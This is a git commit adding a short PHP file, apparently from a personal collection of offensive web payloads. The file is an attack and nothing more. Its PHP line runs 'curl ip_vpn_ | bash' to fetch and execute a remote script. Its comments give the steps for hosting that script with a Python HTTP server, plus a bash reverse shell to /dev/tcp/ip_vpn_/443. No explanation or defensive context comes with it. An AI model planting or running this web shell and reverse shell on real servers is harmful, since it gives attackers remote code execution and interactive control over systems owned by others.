522cd0a5aafee90c5fe5bfe205a88498b2614497
KK <local@host.com>
2026-01-08 18:34:02 -0500

    .

---
+++ 0xo0o0/00_WEB/PHP/a02__curl_bash_.php
@@ -0,0 +1,12 @@
+<?php
+	system("curl ip_vpn_ | bash");
+?>
+
+## ::: python3 -m http.server 80 -d $(pwd)
+
+// ::: touch index.html
+
+		/*
+			#!/bin/bash
+			bash -i >& /dev/tcp/ip_vpn_/443 0>&1	
+		*/
